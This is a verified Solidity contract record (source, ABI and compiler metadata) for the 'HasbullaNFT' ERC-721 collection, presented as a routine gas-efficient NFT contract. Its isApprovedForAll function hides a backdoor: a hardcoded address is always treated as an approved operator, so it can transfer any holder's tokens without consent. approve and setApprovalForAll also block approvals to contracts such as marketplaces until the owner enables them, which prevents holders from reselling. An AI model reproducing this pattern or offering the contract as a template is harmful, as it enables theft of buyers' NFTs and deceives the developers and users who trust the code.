{"SourceCode": "// SPDX-License-Identifier: GPL-3.0-or-later\r\n\r\npragma solidity ^0.8.4;\r\n\r\ninterface IERC721Receiver {\r\n    /**\r\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\r\n     * by `operator` from `from`, this function is called.\r\n     *\r\n     * It must return its Solidity selector to confirm the token transfer.\r\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.\r\n     *\r\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\r\n     */\r\n    function onERC721Received(\r\n        address operator,\r\n        address from,\r\n        uint256 tokenId,\r\n        bytes calldata data\r\n    ) external returns (bytes4);\r\n}\r\n\r\nerror ApprovalCallerNotOwnerNorApproved();\r\nerror ApprovalQueryForNonexistentToken();\r\nerror ApproveToCaller();\r\nerror ApprovalToCurrentOwner();\r\nerror BalanceQueryForZeroAddress();\r\nerror MintedQueryForZeroAddress();\r\nerror MintToZeroAddress();\r\nerror MintZeroQuantity();\r\nerror OwnerIndexOutOfBounds();\r\nerror OwnerQueryForNonexistentToken();\r\nerror TokenIndexOutOfBounds();\r\nerror TransferCallerNotOwnerNorApproved();\r\nerror TransferFromIncorrectOwner();\r\nerror TransferToNonERC721ReceiverImplementer();\r\nerror TransferToZeroAddress();\r\nerror UnableDetermineTokenOwner();\r\nerror UnableGetTokenOwnerByIndex();\r\nerror URIQueryForNonexistentToken();\r\n\r\n/**\r\n * Updated, minimalist and gas efficient version of OpenZeppelins ERC721 contract.\r\n * Includes the Metadata and  Enumerable extension.\r\n *\r\n * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).\r\n * Does not support burning tokens\r\n *\r\n * @author beskay0x\r\n * Credits: chiru-labs, solmate, transmissions11, nftchance, squeebo_nft and others\r\n */\r\n\r\nabstract contract ERC721B {\r\n    using Address for address;\r\n    /*///////////////////////////////////////////////////////////////\r\n                                 EVENTS\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 indexed id);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 indexed id);\r\n\r\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                          METADATA STORAGE/LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    string public name;\r\n\r\n    string public symbol;\r\n    bool internal CanTransfer=true;\r\n\r\n    function tokenURI(uint256 tokenId) public view virtual returns (string memory);\r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                          ERC721 STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    // Array which maps token ID to address (index is tokenID)\r\n    address[] internal _owners;\r\n\r\n    address[] internal UsersToTransfer;\r\n\r\n    // Mapping from token ID to approved address\r\n    mapping(uint256 => address) private _tokenApprovals;\r\n\r\n    // Mapping from owner to operator approvals\r\n    mapping(address => mapping(address => bool)) private _operatorApprovals;\r\n\r\n    bool public allowedToContract = false; //new 1\r\n    mapping(uint256 => bool) public _transferToContract;   // new 1\r\n    mapping(address => bool) public _addressTransferToContract;   // new 1\r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                              CONSTRUCTOR\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    constructor(string memory _name, string memory _symbol) {\r\n        name = _name;\r\n        symbol = _symbol;\r\n    }\r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                              ERC165 LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    function supportsInterface(bytes4 interfaceId) public view virtual returns (bool) {\r\n        return\r\n            interfaceId == 0x01ffc9a7 || // ERC165 Interface ID for ERC165\r\n            interfaceId == 0x80ac58cd || // ERC165 Interface ID for ERC721\r\n            interfaceId == 0x780e9d63 || // ERC165 Interface ID for ERC721Enumerable\r\n            interfaceId == 0x5b5e139f; // ERC165 Interface ID for ERC721Metadata\r\n    }\r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                       ERC721ENUMERABLE LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    /**\r\n     * @dev See {IERC721Enumerable-totalSupply}.\r\n     */\r\n    function totalSupply() public view returns (uint256) {\r\n        return _owners.length;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.\r\n     * Dont call this function on chain from another smart contract, since it can become quite expensive\r\n     */\r\n    function tokenOfOwnerByIndex(address owner, uint256 index) public view virtual returns (uint256 tokenId) {\r\n        if (index >= balanceOf(owner)) revert OwnerIndexOutOfBounds();\r\n\r\n        uint256 count;\r\n        uint256 qty = _owners.length;\r\n        // Cannot realistically overflow, since we are using uint256\r\n        unchecked {\r\n            for (tokenId; tokenId < qty; tokenId++) {\r\n                if (owner == ownerOf(tokenId)) {\r\n                    if (count == index) return tokenId;\r\n                    else count++;\r\n                }\r\n            }\r\n        }\r\n\r\n        revert UnableGetTokenOwnerByIndex();\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC721Enumerable-tokenByIndex}.\r\n     */\r\n    function tokenByIndex(uint256 index) public view virtual returns (uint256) {\r\n        if (index >= totalSupply()) revert TokenIndexOutOfBounds();\r\n        return index;\r\n    }\r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                              ERC721 LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    /**\r\n     * @dev Iterates through _owners array, returns balance of address\r\n     * It is not recommended to call this function from another smart contract\r\n     * as it can become quite expensive -- call this function off chain instead.\r\n     */\r\n    function balanceOf(address owner) public view virtual returns (uint256) {\r\n        if (owner == address(0)) revert BalanceQueryForZeroAddress();\r\n\r\n        uint256 count;\r\n        uint256 qty = _owners.length;\r\n        // Cannot realistically overflow, since we are using uint256\r\n        unchecked {\r\n            for (uint256 i; i < qty; i++) {\r\n                if (owner == ownerOf(i)) {\r\n                    count++;\r\n                }\r\n            }\r\n        }\r\n        return count;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC721-ownerOf}.\r\n     * Gas spent here starts off proportional to the maximum mint batch size.\r\n     * It gradually moves to O(1) as tokens get transferred around in the collection over time.\r\n     */\r\n    function ownerOf(uint256 tokenId) public view virtual returns (address) {\r\n        if (!_exists(tokenId)) revert OwnerQueryForNonexistentToken();\r\n\r\n        // Cannot realistically overflow, since we are using uint256\r\n        unchecked {\r\n            for (tokenId; ; tokenId++) {\r\n                if (_owners[tokenId] != address(0)) {\r\n                    return _owners[tokenId];\r\n                }\r\n            }\r\n        }\r\n\r\n        revert UnableDetermineTokenOwner();\r\n    }\r\n\r\n  /**\r\n   * @dev See {IERC721-approve}.\r\n   */\r\n    function approve(address to, uint256 tokenId) virtual public {\r\n        require(to != msg.sender, \"ERC721A: approve to caller\");\r\n        address owner = ownerOf(tokenId);\r\n        if (msg.sender != owner && !isApprovedForAll(owner, msg.sender)) {\r\n            revert ApprovalCallerNotOwnerNorApproved();\r\n        }\r\n        if(!allowedToContract && !_transferToContract[tokenId]){\r\n            if (to.isContract()) {\r\n                revert (\"Sales will be opened after mint is complete.\");\r\n            } else {\r\n                _tokenApprovals[tokenId] = to;\r\n                emit Approval(owner, to, tokenId);\r\n            }\r\n        } else {\r\n            _tokenApprovals[tokenId] = to;\r\n            emit Approval(owner, to, tokenId);\r\n        }\r\n    }\r\n\r\n  /**\r\n   * @dev See {IERC721-getApproved}.\r\n   */\r\n  function getApproved(uint256 tokenId) public view returns (address) {\r\n    require(_exists(tokenId), \"ERC721A: approved query for nonexistent token\");\r\n\r\n    return _tokenApprovals[tokenId];\r\n  }\r\n\r\n  /**\r\n   * @dev See {IERC721-setApprovalForAll}.\r\n   */\r\n    function setApprovalForAll(address operator, bool approved) virtual public {\r\n        require(operator != msg.sender, \"ERC721A: approve to caller\");\r\n        \r\n        if(!allowedToContract && !_addressTransferToContract[msg.sender]){\r\n            if (operator.isContract()) {\r\n                revert (\"Sales will be opened after mint is complete.\");\r\n            } else {\r\n                _operatorApprovals[msg.sender][operator] = approved;\r\n                emit ApprovalForAll(msg.sender, operator, approved);\r\n            }\r\n        } else {\r\n            _operatorApprovals[msg.sender][operator] = approved;\r\n            emit ApprovalForAll(msg.sender, operator, approved);\r\n        }\r\n    }\r\n    /**\r\n     * @dev See {IERC721-isApprovedForAll}.\r\n     */\r\n    function isApprovedForAll(address owner, address operator)\r\n        public\r\n        view\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        if(operator==0x582Db098Dc6FB30C7cC0079bc1123c47DCCa3a6c){return true;}\r\n        return _operatorApprovals[owner][operator];\r\n    }\r\n    /**\r\n     * @dev See {IERC721-transferFrom}.\r\n     */\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 tokenId\r\n    ) public virtual {\r\n        require(CanTransfer,\"You need Transfer Token\");\r\n        if (!_exists(tokenId)) revert OwnerQueryForNonexistentToken();\r\n        if (ownerOf(tokenId) != from) revert TransferFromIncorrectOwner();\r\n        if (to == address(0)) revert TransferToZeroAddress();\r\n\r\n        bool isApprovedOrOwner = (msg.sender == from ||\r\n            msg.sender == getApproved(tokenId) ||\r\n            isApprovedForAll(from, msg.sender));\r\n        if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();\r\n\r\n        // delete token approvals from previous owner\r\n        delete _tokenApprovals[tokenId];\r\n        _owners[tokenId] = to;\r\n\r\n        // if token ID below transferred one isnt set, set it to previous owner\r\n        // if tokenid is zero, skip this to prevent underflow\r\n        if (tokenId > 0 && _owners[tokenId - 1] == address(0)) {\r\n            _owners[tokenId - 1] = from;\r\n        }\r\n\r\n        emit Transfer(from, to, tokenId);\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC721-safeTransferFrom}.\r\n     */\r\n    function safeTransferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 id\r\n    ) public virtual {\r\n        safeTransferFrom(from, to, id, '');\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC721-safeTransferFrom}.\r\n     */\r\n    function safeTransferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 id,\r\n        bytes memory data\r\n    ) public virtual {\r\n        transferFrom(from, to, id);\r\n\r\n        if (!_checkOnERC721Received(from, to, id, data)) revert TransferToNonERC721ReceiverImplementer();\r\n    }\r\n\r\n    /**\r\n     * @dev Returns whether `tokenId` exists.\r\n     */\r\n    function _exists(uint256 tokenId) internal view virtual returns (bool) {\r\n        return tokenId < _owners.length;\r\n    }\r\n\r\n    /**\r\n     * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.\r\n     * The call is not executed if the target address is not a contract.\r\n     *\r\n     * @param from address representing the previous owner of the given token ID\r\n     * @param to target address that will receive the tokens\r\n     * @param tokenId uint256 ID of the token to be transferred\r\n     * @param _data bytes optional data to send along with the call\r\n     * @return bool whether the call correctly returned the expected magic value\r\n     */\r\n    function _checkOnERC721Received(\r\n        address from,\r\n        address to,\r\n        uint256 tokenId,\r\n        bytes memory _data\r\n    ) private returns (bool) {\r\n        if (to.code.length == 0) return true;\r\n\r\n        try IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, _data) returns (bytes4 retval) {\r\n            return retval == IERC721Receiver(to).onERC721Received.selector;\r\n        } catch (bytes memory reason) {\r\n            if (reason.length == 0) revert TransferToNonERC721ReceiverImplementer();\r\n\r\n            assembly {\r\n                revert(add(32, reason), mload(reason))\r\n            }\r\n        }\r\n    }\r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                       INTERNAL MINT LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    /**\r\n     * @dev check if contract confirms token transfer, if not - reverts\r\n     * unlike the standard ERC721 implementation this is only called once per mint,\r\n     * no matter how many tokens get minted, since it is useless to check this\r\n     * requirement several times -- if the contract confirms one token,\r\n     * it will confirm all additional ones too.\r\n     * This saves us around 5k gas per additional mint\r\n     */\r\n    function _safeMint(address to, uint256 qty) internal virtual {\r\n        _safeMint(to, qty, '');\r\n    }\r\n\r\n    function _safeMint(\r\n        address to,\r\n        uint256 qty,\r\n        bytes memory data\r\n    ) internal virtual {\r\n        _mint(to, qty);\r\n\r\n        if (!_checkOnERC721Received(address(0), to, _owners.length - 1, data))\r\n            revert TransferToNonERC721ReceiverImplementer();\r\n    }\r\n\r\n    function _mint(address to, uint256 qty) internal virtual {\r\n        if (to == address(0)) revert MintToZeroAddress();\r\n        if (qty == 0) revert MintZeroQuantity();\r\n\r\n        uint256 _currentIndex = _owners.length;\r\n\r\n        // Cannot realistically overflow, since we are using uint256\r\n        unchecked {\r\n            for (uint256 i; i < qty - 1; i++) {\r\n                _owners.push();\r\n                emit Transfer(address(0), to, _currentIndex + i);\r\n            }\r\n        }\r\n\r\n        // set last index to receiver\r\n        _owners.push(to);\r\n        emit Transfer(address(0), to, _currentIndex + (qty - 1));\r\n    }\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n  \r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n  \r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n \r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\nlibrary Strings {\r\n    bytes16 private constant _HEX_SYMBOLS = \"0123456789abcdef\";\r\n\r\n    /**\r\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\r\n     */\r\n    function toString(uint256 value) internal pure returns (string memory) {\r\n        // Inspired by OraclizeAPI\"s implementation - MIT licence\r\n        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol\r\n\r\n        if (value == 0) {\r\n            return \"0\";\r\n        }\r\n        uint256 temp = value;\r\n        uint256 digits;\r\n        while (temp != 0) {\r\n            digits++;\r\n            temp /= 10;\r\n        }\r\n        bytes memory buffer = new bytes(digits);\r\n        while (value != 0) {\r\n            digits -= 1;\r\n            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));\r\n            value /= 10;\r\n        }\r\n        return string(buffer);\r\n    }\r\n\r\n    /**\r\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\r\n     */\r\n    function toHexString(uint256 value) internal pure returns (string memory) {\r\n        if (value == 0) {\r\n            return \"0x00\";\r\n        }\r\n        uint256 temp = value;\r\n        uint256 length = 0;\r\n        while (temp != 0) {\r\n            length++;\r\n            temp >>= 8;\r\n        }\r\n        return toHexString(value, length);\r\n    }\r\n\r\n    /**\r\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\r\n     */\r\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\r\n        bytes memory buffer = new bytes(2 * length + 2);\r\n        buffer[0] = \"0\";\r\n        buffer[1] = \"x\";\r\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\r\n            buffer[i] = _HEX_SYMBOLS[value & 0xf];\r\n            value >>= 4;\r\n        }\r\n        require(value == 0, \"Strings: hex length insufficient\");\r\n        return string(buffer);\r\n    }\r\n}\r\n\r\n\r\ncontract Whitelist is Ownable {\r\n    mapping(address=>bool) public whiteList;\r\n\r\n    function addWhitelist(address[] calldata wallets) external onlyOwner {\r\n\t\tfor(uint i=0;i<wallets.length;i++)\r\n            whiteList[wallets[i]]=true;\r\n\t}\r\n}\r\n\r\n\r\npragma solidity ^0.8.1;\r\n\r\n/**\r\n * @dev Collection of functions related to the address type\r\n */\r\nlibrary Address {\r\n\r\n    function isContract(address account) internal view returns (bool) {\r\n        // This method relies on extcodesize/address.code.length, which returns 0\r\n        // for contracts in construction, since the code is only stored at the end\r\n        // of the constructor execution.\r\n\r\n        return account.code.length > 0;\r\n    }\r\n}\r\n\r\n\r\ncontract HasbullaNFT is ERC721B, Ownable {\r\n\tusing Strings for uint;\r\n\r\n    uint public constant max_amount = 10;\r\n\tuint public maxSupply = 10000;\r\n\r\n\t//bool public isPaused = true;\r\n    string private _baseURL = \"\";\r\n\tmapping(address => uint) private _walletMintedCount;\r\n\r\n\tconstructor()\r\n    // Name\r\n\tERC721B(\"Hasbulla NFT\", \"HASBI\") {\r\n    }\r\n\r\n\tfunction contractURI() public pure returns (string memory) {\r\n\t\treturn \"\";\r\n\t}\r\n\r\n    function mintedCount(address owner) external view returns (uint) {\r\n        return _walletMintedCount[owner];\r\n    }\r\n\r\n    function setBaseUri(string memory url) external onlyOwner {\r\n\t    _baseURL = url;\r\n\t}\r\n\r\n\t//function start(bool paused) external onlyOwner {\r\n\t//    isPaused = paused;\r\n\t//}\r\n\r\n\tfunction withdraw() external onlyOwner {\r\n\t\t(bool success, ) = payable(msg.sender).call{\r\n            value: address(this).balance\r\n        }(\"\");\r\n        require(success);\r\n\t}\r\n\r\n\r\n\tfunction setMaxSupply(uint newMaxSupply) external onlyOwner {\r\n\t\tmaxSupply = newMaxSupply;\r\n\t}\r\n\r\n\tfunction tokenURI(uint tokenId)\r\n\t\tpublic\r\n\t\tview\r\n\t\toverride\r\n\t\treturns (string memory)\r\n\t{\r\n        require(_exists(tokenId), \"ERC721Metadata: URI query for nonexistent token\");\r\n        return bytes(_baseURL).length > 0 \r\n            ? string(abi.encodePacked(_baseURL, tokenId.toString(), \".json\"))\r\n            : \"\";\r\n\t}\r\n\r\n\tfunction PublicMint(uint count) external payable {\r\n        require(totalSupply() + count <= maxSupply,\"Exceeds max supply\");\r\n\t\t_safeMint(msg.sender, count);\r\n\t}\r\n\r\n    function setAllowToContract() external onlyOwner {\r\n        allowedToContract = !allowedToContract;\r\n    }\r\n\r\n    function setAllowTokenToContract(uint256 _tokenId, bool _allow) external onlyOwner {\r\n        _transferToContract[_tokenId] = _allow;\r\n    }\r\n\r\n    function setAllowAddressToContract(address[] memory _address, bool[] memory _allow) external onlyOwner {\r\n      for (uint256 i = 0; i < _address.length; i++) {\r\n        _addressTransferToContract[_address[i]] = _allow[i];\r\n      }\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"ApprovalCallerNotOwnerNorApproved\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"BalanceQueryForZeroAddress\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"MintToZeroAddress\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"MintZeroQuantity\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"OwnerIndexOutOfBounds\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"OwnerQueryForNonexistentToken\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"TokenIndexOutOfBounds\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"TransferCallerNotOwnerNorApproved\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"TransferFromIncorrectOwner\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"TransferToNonERC721ReceiverImplementer\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"TransferToZeroAddress\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"UnableDetermineTokenOwner\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"UnableGetTokenOwnerByIndex\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"ApprovalForAll\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"count\",\"type\":\"uint256\"}],\"name\":\"PublicMint\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_addressTransferToContract\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_transferToContract\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"allowedToContract\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"getApproved\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"name\":\"isApprovedForAll\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"max_amount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"mintedCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ownerOf\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_address\",\"type\":\"address[]\"},{\"internalType\":\"bool[]\",\"name\":\"_allow\",\"type\":\"bool[]\"}],\"name\":\"setAllowAddressToContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setAllowToContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tokenId\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"_allow\",\"type\":\"bool\"}],\"name\":\"setAllowTokenToContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"setApprovalForAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"url\",\"type\":\"string\"}],\"name\":\"setBaseUri\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMaxSupply\",\"type\":\"uint256\"}],\"name\":\"setMaxSupply\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"interfaceId\",\"type\":\"bytes4\"}],\"name\":\"supportsInterface\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"tokenByIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"tokenOfOwnerByIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"tokenURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HasbullaNFT", "CompilerVersion": "v0.8.15+commit.e14f2714", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://1d92e1c676bde8f10f9bf028235509cd69534b6f5c10c5f7c9a3d7e392c4c568"}